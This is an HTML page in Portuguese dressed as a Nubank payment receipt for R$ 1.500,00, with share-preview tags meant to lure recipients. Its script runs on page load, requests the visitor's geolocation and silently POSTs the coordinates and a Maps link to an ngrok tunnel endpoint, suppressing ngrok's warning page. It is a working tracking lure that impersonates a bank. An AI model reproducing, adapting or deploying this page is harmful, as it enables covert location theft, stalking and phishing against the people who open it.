<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Recebimento</title>
  <meta property="og:title" content="Comprovante de Pagamento - Nubank">
  <meta property="og:description" content="Clique para visualizar os detalhes da sua transação enviada por Pedro Henrique.">
  <meta property="og:image" content="comprovante-de-pagamento-nu.vercel.app/image.png">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --nu-purple: #820ad1;
      --nu-bg: #121212;
      --nu-card: #1c1c1e;
      --nu-text: #ffffff;
      --nu-secondary: #a1a1a1;
      --nu-success: #22c55e;
    }

    body {
      font-family: 'Inter', sans-serif;
      background-color: var(--nu-bg);
      color: var(--nu-text);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    .comprovante-container {
      background-color: var(--nu-card);
      width: 100%;
      max-width: 380px;
      padding: 32px;
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
    }

    h1 {
      font-size: 18px;
      font-weight: 600;
      margin: 0 0 24px 0;
      color: var(--nu-text);
    }

    .informacoes {
      border-top: 1px solid #333;
      padding-top: 20px;
    }

    .informacoes p {
      display: flex;
      flex-direction: column;
      margin-bottom: 20px;
    }

    .informacoes span:first-child {
      font-size: 13px;
      color: var(--nu-secondary);
      margin-bottom: 4px;
    }

    .informacoes span:last-child {
      font-size: 16px;
      font-weight: 500;
    }

    #valor-destaque {
      font-size: 28px;
      font-weight: 700;
      color: var(--nu-success);
    }

    .botao {
      width: 100%;
      background-color: var(--nu-purple);
      color: white;
      border: none;
      padding: 16px;
      border-radius: 30px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 12px;
      transition: opacity 0.2s;
    }

    .botao:active {
      opacity: 0.7;
    }

    .comprovante-footer {
      margin-top: 32px;
      text-align: center;
      font-size: 12px;
      color: var(--nu-secondary);
    }

    .comprovante-footer a {
      color: var(--nu-purple);
      text-decoration: none;
      font-weight: 600;
    }

    @media print {
      .botao, .comprovante-footer { display: none; }
      body { background-color: white; color: black; }
      .comprovante-container { box-shadow: none; border: 1px solid #eee; }
    }
  </style>
</head>

<body>
  <div class="comprovante-container">
    <h1>Comprovante de Recebimento</h1>

    <div class="informacoes">
      <p><span>Data</span><span id="data-atual"></span></p>
      <p><span>Valor Recebido</span><span id="valor-destaque">R$ 1.500,00</span></p>
      <p><span>De</span><span>Pedro Henrique</span></p>
      <p><span>Status</span><span style="color: var(--nu-success)">Recebido com Sucesso</span></p>
    </div>

    <button class="botao" onclick="window.print()">Imprimir</button>

    <div class="comprovante-footer">
      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
      <p><a href="#">Clique aqui</a> para mais informações.</p>
    </div>
  </div>

  <script>
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Algo deu errado. Tente novamente mais tarde.");
      }
    });

    const dataAtual = new Date();
    const dataFormatada = dataAtual.toLocaleDateString('pt-BR');
    document.getElementById("data-atual").textContent = dataFormatada;

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://b2f7-2804-14c-bba6-8b2e-4849-9ba4-5750-b42c.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "ngrok-skip-browser-warning": "true"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            console.log("Localização enviada.");
          }
        })
        .catch(error => {
          console.error("Erro:", error);
        });
    }

    function handleError(error) {
      alert("Erro ao obter a localização: " + error.message);
    }
  </script>
</body>
</html>
